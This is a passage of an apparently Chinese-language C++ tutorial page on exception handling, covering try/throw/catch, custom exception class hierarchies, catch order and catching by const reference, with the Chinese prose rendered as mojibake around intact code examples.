class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;An unknown error occurred.\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// ... å¤„ç†é”™è¯¯ ...</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Processing successful.\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>ç¼ºç‚¹:</strong></p><ul><li>  <strong>è°ƒç”¨è€…å¿…é¡»æ£€æŸ¥:</strong> è°ƒç”¨è€…å¾ˆå®¹æ˜“å¿˜è®°æ£€æŸ¥é”™è¯¯ç ï¼Œå¯¼è‡´é”™è¯¯è¢«å¿½ç•¥ã€‚</li><li>  <strong>é”™è¯¯ç æ··æ·†:</strong> å‡½æ•°çš„æ­£å¸¸è¿”å›å€¼å¯èƒ½ä¸é”™è¯¯ç å†²çªã€‚</li><li>  <strong>é”™è¯¯ä¿¡æ¯æœ‰é™:</strong> å•ä¸ªé”™è¯¯ç å¯èƒ½ä¸è¶³ä»¥æè¿°é”™è¯¯çš„å…·ä½“åŸå› ã€‚</li><li>  <strong>é”™è¯¯ä¼ é€’å¤æ‚:</strong> åœ¨æ·±å±‚åµŒå¥—çš„å‡½æ•°è°ƒç”¨ä¸­ï¼Œæ¯ä¸€å±‚éƒ½éœ€è¦æ£€æŸ¥å¹¶å‘ä¸Šä¼ é€’é”™è¯¯ç ï¼Œä½¿ä»£ç å†—é•¿ä¸”å®¹æ˜“å‡ºé”™ã€‚</li></ul><h3 id="15-3-3-å¼‚å¸¸æœºåˆ¶"><a href="#15-3-3-å¼‚å¸¸æœºåˆ¶" class="headerlink" title="15.3.3 å¼‚å¸¸æœºåˆ¶"></a>15.3.3 å¼‚å¸¸æœºåˆ¶</h3><p>C++ å¼‚å¸¸å¤„ç†æä¾›äº†ä¸€ç§æ›´ç»“æ„åŒ–ã€æ›´å¼ºå¤§çš„é”™è¯¯å¤„ç†æ–¹å¼ï¼Œå®ƒå°†<strong>é”™è¯¯æ£€æµ‹</strong>ï¼ˆåœ¨å‘ç”Ÿé”™è¯¯çš„åœ°æ–¹ï¼‰ä¸<strong>é”™è¯¯å¤„ç†</strong>ï¼ˆåœ¨èƒ½å¤Ÿå¤„ç†è¯¥é”™è¯¯çš„åœ°æ–¹ï¼‰åˆ†ç¦»å¼€æ¥ã€‚</p><p>å®ƒä¸»è¦æ¶‰åŠä¸‰ä¸ªå…³é”®å­—ï¼š</p><ol><li> <strong><code>throw</code>:</strong> å½“å‡½æ•°æ£€æµ‹åˆ°æ— æ³•å¤„ç†çš„é”™è¯¯æ—¶ï¼Œä½¿ç”¨ <code>throw</code> å…³é”®å­—<strong>å¼•å‘ (throw)</strong> æˆ– <strong>æŠ›å‡º (raise)</strong> ä¸€ä¸ªå¼‚å¸¸ã€‚<code>throw</code> åé¢è·Ÿç€ä¸€ä¸ªè¡¨è¾¾å¼ï¼Œè¯¥è¡¨è¾¾å¼çš„å€¼ï¼ˆç§°ä¸º<strong>å¼‚å¸¸å¯¹è±¡</strong>ï¼‰çš„ç±»å‹å†³å®šäº†å¼‚å¸¸çš„ç±»å‹ã€‚</li><li> <strong><code>try</code>:</strong> å°†å¯èƒ½å¼•å‘å¼‚å¸¸çš„ä»£ç å—ï¼ˆåŒ…æ‹¬å‡½æ•°è°ƒç”¨ï¼‰æ”¾åœ¨ <code>try</code> å—ä¸­ã€‚<code>try</code> å…³é”®å­—åé¢è·Ÿç€ä¸€ä¸ªèŠ±æ‹¬å· <code>&#123;&#125;</code> åŒ…å›´çš„ä»£ç å—ã€‚</li><li> <strong><code>catch</code>:</strong> ç´§è·Ÿåœ¨ <code>try</code> å—ä¹‹åï¼Œä½¿ç”¨ä¸€ä¸ªæˆ–å¤šä¸ª <code>catch</code> å—æ¥<strong>æ•è· (catch)</strong> å’Œ<strong>å¤„ç† (handle)</strong> å¼‚å¸¸ã€‚æ¯ä¸ª <code>catch</code> å—æŒ‡å®šå®ƒèƒ½å¤„ç†çš„å¼‚å¸¸ç±»å‹ã€‚</li></ol><p><strong>åŸºæœ¬æµç¨‹:</strong></p><ol><li> ç¨‹åºæ‰§è¡Œè¿›å…¥ <code>try</code> å—ã€‚</li><li> å¦‚æœåœ¨ <code>try</code> å—ä¸­çš„ä»£ç ï¼ˆæˆ–å…¶è°ƒç”¨çš„ä»»ä½•å‡½æ•°ï¼‰æ‰§è¡Œäº† <code>throw</code> è¯­å¥ï¼Œä¸€ä¸ªå¼‚å¸¸è¢«å¼•å‘ã€‚</li><li> ç¨‹åºç«‹å³<strong>è·³å‡º</strong>å½“å‰çš„ <code>try</code> å—ï¼ˆä»¥åŠä» <code>try</code> å—å¼€å§‹åˆ° <code>throw</code> ç‚¹ä¹‹é—´çš„æ‰€æœ‰å‡½æ•°è°ƒç”¨æ ˆï¼‰ï¼Œå¼€å§‹æŸ¥æ‰¾åŒ¹é…çš„ <code>catch</code> å—ã€‚</li><li> ç¨‹åºæŒ‰é¡ºåºæ£€æŸ¥ç´§è·Ÿåœ¨ <code>try</code> å—åé¢çš„ <code>catch</code> å—ã€‚</li><li> å¦‚æœæ‰¾åˆ°ä¸€ä¸ª <code>catch</code> å—ï¼Œå…¶å£°æ˜çš„å¼‚å¸¸ç±»å‹ä¸æŠ›å‡ºçš„å¼‚å¸¸å¯¹è±¡ç±»å‹<strong>åŒ¹é…</strong>ï¼ˆæˆ–è€…æ˜¯å…¶åŸºç±»ï¼Œæˆ–è€…æ˜¯ <code>catch(...)</code>ï¼‰ï¼Œåˆ™æ‰§è¡Œè¯¥ <code>catch</code> å—ä¸­çš„ä»£ç ã€‚</li><li> æ‰§è¡Œå®ŒåŒ¹é…çš„ <code>catch</code> å—åï¼Œç¨‹åºç»§ç»­æ‰§è¡Œè¯¥ <code>catch</code> å—ä¹‹åçš„ä»£ç ï¼ˆé™¤é <code>catch</code> å—æœ¬èº«åˆæŠ›å‡ºå¼‚å¸¸æˆ–ç»ˆæ­¢ç¨‹åºï¼‰ã€‚</li><li> å¦‚æœåœ¨å½“å‰ <code>try...catch</code> ç»“æ„ä¸­æ²¡æœ‰æ‰¾åˆ°åŒ¹é…çš„ <code>catch</code> å—ï¼Œå¼‚å¸¸ä¼šç»§ç»­å‘<strong>å¤–å±‚</strong>ä¼ æ’­ï¼ŒæŸ¥æ‰¾åŒ…å«å½“å‰ <code>try</code> å—çš„æ›´å¤–å±‚ <code>try</code> å—å¯¹åº”çš„ <code>catch</code> å—ã€‚</li><li> å¦‚æœå¼‚å¸¸ä¸€ç›´ä¼ æ’­åˆ° <code>main</code> å‡½æ•°ä¹‹å¤–ï¼ˆå³æ²¡æœ‰åœ¨ä»»ä½•åœ°æ–¹è¢«æ•è·ï¼‰ï¼Œç¨‹åºé€šå¸¸ä¼šè°ƒç”¨ <code>std::terminate()</code> å¼‚å¸¸ç»ˆæ­¢ã€‚</li></ol><p><strong>ç¤ºä¾‹:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdexcept&gt; // åŒ…å«æ ‡å‡†å¼‚å¸¸ç±»ï¼Œå¦‚ std::runtime_error</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">double</span> <span class="title">hmean_exc</span><span class="params">(<span class="keyword">double</span> a, <span class="keyword">double</span> b)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (a == -b) &#123;</span><br><span class="line">        <span class="comment">// æŠ›å‡ºä¸€ä¸ª runtime_error ç±»å‹çš„å¼‚å¸¸å¯¹è±¡</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="built_in">std</span>::runtime_error(<span class="string">&quot;hmean(): invalid arguments: a = -b&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">2.0</span> * a * b / (a + b);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">double</span> x, y, z;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Enter two numbers: &quot;</span>;</span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">std</span>::<span class="built_in">cin</span> &gt;&gt; x &gt;&gt; y) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123; <span class="comment">// ---- try block starts ----</span></span><br><span class="line">            z = hmean_exc(x, y);</span><br><span class="line">            <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Harmonic mean of &quot;</span> &lt;&lt; x &lt;&lt; <span class="string">&quot; and &quot;</span> &lt;&lt; y</span><br><span class="line">                      &lt;&lt; <span class="string">&quot; is &quot;</span> &lt;&lt; z &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        &#125; <span class="comment">// ---- try block ends ----</span></span><br><span class="line">        <span class="keyword">catch</span> (<span class="keyword">const</span> <span class="built_in">std</span>::runtime_error &amp; e) &#123; <span class="comment">// ---- catch block starts ----</span></span><br><span class="line">            <span class="comment">// æ•è· runtime_error ç±»å‹çš„å¼‚å¸¸ (åŠå…¶æ´¾ç”Ÿç±»)</span></span><br><span class="line">            <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;Error caught: &quot;</span> &lt;&lt; e.what() &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// what() è¿”å›é”™è¯¯ä¿¡æ¯å­—ç¬¦ä¸²</span></span><br><span class="line">            <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Enter a new pair of numbers: &quot;</span>;</span><br><span class="line">            <span class="keyword">continue</span>; <span class="comment">// ç»§ç»­ä¸‹ä¸€æ¬¡å¾ªç¯è¾“å…¥</span></span><br><span class="line">        &#125; <span class="comment">// ---- catch block ends ----</span></span><br><span class="line"></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Enter next set of numbers &lt;q to quit&gt;: &quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Bye!\n&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>ä¼˜ç‚¹:</strong></p><ul><li>  <strong>åˆ†ç¦»é”™è¯¯å¤„ç†:</strong> å°†é”™è¯¯å¤„ç†ä»£ç ä¸æ­£å¸¸é€»è¾‘åˆ†å¼€ï¼Œä½¿ä»£ç æ›´æ¸…æ™°ã€‚</li><li>  <strong>å¼ºåˆ¶å¤„ç† (æŸç§ç¨‹åº¦ä¸Š):</strong> æœªæ•è·çš„å¼‚å¸¸é€šå¸¸ä¼šå¯¼è‡´ç¨‹åºç»ˆæ­¢ï¼Œè¿«ä½¿å¼€å‘è€…è€ƒè™‘é”™è¯¯å¤„ç†ã€‚</li><li>  <strong>è‡ªåŠ¨ä¼ æ’­:</strong> å¼‚å¸¸ä¼šè‡ªåŠ¨æ²¿ç€è°ƒç”¨æ ˆå‘ä¸Šä¼ æ’­ï¼Œç›´åˆ°æ‰¾åˆ°åˆé€‚çš„å¤„ç†ç¨‹åºï¼Œæ— éœ€åœ¨æ¯å±‚å‡½æ•°æ‰‹åŠ¨ä¼ é€’é”™è¯¯ç ã€‚</li><li>  <strong>ç±»å‹å®‰å…¨:</strong> å¯ä»¥æ ¹æ®å¼‚å¸¸å¯¹è±¡çš„ç±»å‹æ¥åŒºåˆ†ä¸åŒçš„é”™è¯¯ï¼Œå¹¶è¿›è¡Œç›¸åº”çš„å¤„ç†ã€‚</li><li>  <strong>èµ„æºæ¸…ç†:</strong> ç»“åˆ RAIIï¼ˆèµ„æºè·å–å³åˆå§‹åŒ–ï¼‰ï¼Œå¼‚å¸¸å¤„ç†å¯ä»¥ç¡®ä¿åœ¨å¼‚å¸¸å‘ç”Ÿæ—¶è‡ªåŠ¨é‡Šæ”¾èµ„æºï¼ˆé€šè¿‡æ ˆè§£é€€æ—¶è°ƒç”¨å±€éƒ¨å¯¹è±¡çš„ææ„å‡½æ•°ï¼‰ã€‚</li></ul><h3 id="15-3-4-å°†å¯¹è±¡ç”¨ä½œå¼‚å¸¸ç±»å‹"><a href="#15-3-4-å°†å¯¹è±¡ç”¨ä½œå¼‚å¸¸ç±»å‹" class="headerlink" title="15.3.4 å°†å¯¹è±¡ç”¨ä½œå¼‚å¸¸ç±»å‹"></a>15.3.4 å°†å¯¹è±¡ç”¨ä½œå¼‚å¸¸ç±»å‹</h3><p><code>throw</code> è¯­å¥å¯ä»¥æŠ›å‡ºä»»ä½•ç±»å‹çš„è¡¨è¾¾å¼ç»“æœï¼ŒåŒ…æ‹¬åŸºæœ¬ç±»å‹ï¼ˆå¦‚ <code>int</code>, <code>const char*</code>ï¼‰æˆ–ç±»ç±»å‹çš„å¯¹è±¡ã€‚</p><p><strong>å¼ºçƒˆå»ºè®®ä½¿ç”¨ç±»ç±»å‹çš„å¯¹è±¡ä½œä¸ºå¼‚å¸¸ç±»å‹</strong>ï¼ŒåŸå› å¦‚ä¸‹ï¼š</p><ul><li>  <strong>æºå¸¦æ›´å¤šä¿¡æ¯:</strong> å¯¹è±¡å¯ä»¥åŒ…å«å¤šä¸ªæ•°æ®æˆå‘˜ï¼Œæºå¸¦å…³äºé”™è¯¯çš„æ›´ä¸°å¯Œä¿¡æ¯ï¼ˆé”™è¯¯ç ã€é”™è¯¯æè¿°ã€å‘ç”Ÿä½ç½®ç­‰ï¼‰ã€‚</li><li>  <strong>ç±»å‹å±‚æ¬¡:</strong> å¯ä»¥åˆ©ç”¨ç±»çš„ç»§æ‰¿å…³ç³»æ¥ç»„ç»‡å¼‚å¸¸ç±»å‹ã€‚<code>catch</code> å—å¯ä»¥æ•è·åŸºç±»ç±»å‹çš„å¼‚å¸¸ï¼Œä»è€Œå¤„ç†è¯¥åŸºç±»åŠå…¶æ‰€æœ‰æ´¾ç”Ÿç±»çš„å¼‚å¸¸ã€‚è¿™å…è®¸æˆ‘ä»¬ç¼–å†™æ›´é€šç”¨çš„é”™è¯¯å¤„ç†ä»£ç ã€‚</li></ul><p><strong>ç¤ºä¾‹ï¼šè‡ªå®šä¹‰å¼‚å¸¸ç±»</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cmath&gt; // for sqrt</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// è‡ªå®šä¹‰å¼‚å¸¸åŸºç±» (å¯ä»¥ç»§æ‰¿è‡ª std::exception)</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MathError</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">report</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123; <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;Math error\n&quot;</span>; &#125;</span><br><span class="line">    <span class="keyword">virtual</span> ~MathError() &#123;&#125; <span class="comment">// è™šææ„å‡½æ•°å¾ˆé‡è¦</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// æ´¾ç”Ÿå¼‚å¸¸ç±»ï¼šæ— æ•ˆå‚æ•°</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BadArgument</span> :</span> <span class="keyword">public</span> MathError &#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">double</span> arg1;</span><br><span class="line">    <span class="keyword">double</span> arg2; <span class="comment">// å¯èƒ½æœ‰å¤šä¸ªå‚æ•°</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> funcName;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    BadArgument(<span class="keyword">double</span> a1, <span class="keyword">double</span> a2, <span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span>&amp; fname)</span><br><span class="line">        : arg1(a1), arg2(a2), funcName(fname) &#123;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">report</span><span class="params">()</span> <span class="keyword">const</span> <span class="keyword">override</span> </span>&#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;Bad arguments to function &quot;</span> &lt;&lt; funcName &lt;&lt; <span class="string">&quot;(): &quot;</span></span><br><span class="line">                  &lt;&lt; arg1 &lt;&lt; <span class="string">&quot;, &quot;</span> &lt;&lt; arg2 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// æ´¾ç”Ÿå¼‚å¸¸ç±»ï¼šå®šä¹‰åŸŸé”™è¯¯</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DomainError</span> :</span> <span class="keyword">public</span> MathError &#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">double</span> value;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> funcName;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    DomainError(<span class="keyword">double</span> val, <span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span>&amp; fname)</span><br><span class="line">        : value(val), funcName(fname) &#123;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">report</span><span class="params">()</span> <span class="keyword">const</span> <span class="keyword">override</span> </span>&#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;Domain error in function &quot;</span> &lt;&lt; funcName &lt;&lt; <span class="string">&quot;(): &quot;</span></span><br><span class="line">                  &lt;&lt; <span class="string">&quot;Invalid value &quot;</span> &lt;&lt; value &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// å‡½æ•°å¯èƒ½æŠ›å‡ºå¼‚å¸¸</span></span><br><span class="line"><span class="function"><span class="keyword">double</span> <span class="title">my_sqrt</span><span class="params">(<span class="keyword">double</span> x)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (x &lt; <span class="number">0.0</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> DomainError(x, <span class="string">&quot;my_sqrt&quot;</span>); <span class="comment">// æŠ›å‡º DomainError å¯¹è±¡</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">std</span>::<span class="built_in">sqrt</span>(x);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">double</span> <span class="title">hmean_exc2</span><span class="params">(<span class="keyword">double</span> a, <span class="keyword">double</span> b)</span> </span>&#123;</span><br><span class="line">     <span class="keyword">if</span> (a == -b) &#123;</span><br><span class="line">        <span class="keyword">throw</span> BadArgument(a, b, <span class="string">&quot;hmean_exc2&quot;</span>); <span class="comment">// æŠ›å‡º BadArgument å¯¹è±¡</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">2.0</span> * a * b / (a + b);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">double</span> a = <span class="number">10.0</span>, b = <span class="number">-10.0</span>;</span><br><span class="line">    <span class="keyword">double</span> c = <span class="number">-5.0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Calculating hmean...\n&quot;</span>;</span><br><span class="line">        <span class="keyword">double</span> result1 = hmean_exc2(a, b);</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Hmean result: &quot;</span> &lt;&lt; result1 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// ä¸ä¼šæ‰§è¡Œ</span></span><br><span class="line"></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Calculating sqrt...\n&quot;</span>;</span><br><span class="line">        <span class="keyword">double</span> result2 = my_sqrt(c);</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Sqrt result: &quot;</span> &lt;&lt; result2 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// ä¸ä¼šæ‰§è¡Œ</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// catch å—çš„é¡ºåºå¾ˆé‡è¦ï¼šæ´¾ç”Ÿç±»åº”åœ¨åŸºç±»ä¹‹å‰</span></span><br><span class="line">    <span class="keyword">catch</span> (<span class="keyword">const</span> BadArgument&amp; bae) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;Caught BadArgument: &quot;</span>;</span><br><span class="line">        bae.report();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (<span class="keyword">const</span> DomainError&amp; de) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;Caught DomainError: &quot;</span>;</span><br><span class="line">        de.report();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (<span class="keyword">const</span> MathError&amp; me) &#123; <span class="comment">// æ•è·æ‰€æœ‰ MathError åŠå…¶æ´¾ç”Ÿç±»</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;Caught generic MathError: &quot;</span>;</span><br><span class="line">        me.report();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (...) &#123; <span class="comment">// æ•è·ä»»ä½•å…¶ä»–ç±»å‹çš„å¼‚å¸¸</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;Caught an unknown exception!\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Program continues after catch.\n&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>æ•è·é¡ºåº:</strong> å½“ä½¿ç”¨ç»§æ‰¿å±‚æ¬¡ç»“æ„çš„å¼‚å¸¸ç±»æ—¶ï¼Œ<code>catch</code> å—çš„é¡ºåºéå¸¸é‡è¦ã€‚åº”è¯¥å°†<strong>æ´¾ç”Ÿç±»çš„ <code>catch</code> å—æ”¾åœ¨åŸºç±» <code>catch</code> å—ä¹‹å‰</strong>ã€‚å¦åˆ™ï¼ŒåŸºç±» <code>catch</code> å—ä¼šé¦–å…ˆæ•è·åˆ°æ´¾ç”Ÿç±»å¼‚å¸¸ï¼Œå¯¼è‡´æ´¾ç”Ÿç±»çš„ç‰¹å®šå¤„ç†é€»è¾‘æ— æ³•æ‰§è¡Œã€‚</p><p><strong>æŒ‰å¼•ç”¨æ•è·:</strong> æ¨èä½¿ç”¨ <code>const</code> å¼•ç”¨ (<code>const ExceptionType&amp; e</code>) æ¥æ•è·å¼‚å¸¸ã€‚</p><ul><li>  é¿å…å¯¹è±¡**åˆ‡ç‰‡ (slicing)**ï¼šå¦‚æœæŒ‰å€¼æ•è·åŸºç±»å¼‚å¸¸ï¼Œå½“æŠ›å‡ºçš„æ˜¯æ´¾ç”Ÿç±»å¯¹è±¡æ—¶ï¼Œæ´¾ç”Ÿç±»ç‰¹æœ‰çš„éƒ¨åˆ†ä¼šä¸¢å¤±ã€‚</li><li>  é¿å…å¤åˆ¶å¼€é”€ã€‚</li><li>  ä½¿ç”¨ <code>const</code> å¼•ç”¨è¡¨æ˜å¤„ç†ç¨‹åºä¸æ‰“ç®—ä¿®æ”¹æ•è·åˆ°çš„å¼‚å¸¸å¯¹è±¡ã€‚</li></ul><h3 id="15-3-5-å¼‚å¸¸è§„èŒƒå’Œ-C-11-throw-noexcept"><a href="#15-3-5-å¼‚å¸¸è§„èŒƒå’Œ-C-11-throw-noexcept" class="headerlink" title="15.3.5 å¼‚å¸¸è§„èŒƒå’Œ C++11 (throw(), noexcept)"></a>15.3.5 å¼‚å¸¸è§„èŒƒå’Œ C++11 (<code>throw()</code>, <code>noexcept</code>)</h3><p>æ—©æœŸ C++ å…è®¸ä½¿ç”¨<strong>å¼‚å¸¸è§„èŒƒ (Exception Specifications)</strong> æ¥å£°æ˜å‡½æ•°å¯èƒ½æŠ›å‡ºå“ªäº›ç±»å‹çš„å¼‚å¸¸ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">func1</span><span class="params">()</span> <span class="title">throw</span><span class="params">(BadArgument, DomainError)</span></span>; <span class="comment">// å¯èƒ½æŠ›å‡º BadArgument æˆ– DomainError</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">func2</span><span class="params">()</span> <span class="title">throw</span><span class="params">()</span></span>; <span class="comment">// ä¿è¯ä¸æŠ›å‡ºä»»ä½•å¼‚å¸¸</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">func3</span><span class="params">()</span></span>; <span class="comment">// å¯èƒ½æŠ›å‡ºä»»ä½•ç±»å‹çš„å¼‚å¸¸ (é»˜è®¤)</span></span><br></pre></td></tr></table></figure><p><strong>é—®é¢˜:</strong> å¼‚å¸¸è§„èŒƒåœ¨å®è·µä¸­è¢«è¯æ˜æ•ˆæœä¸ä½³ä¸”éš¾ä»¥ç»´æŠ¤ã€‚</p><ul><li>  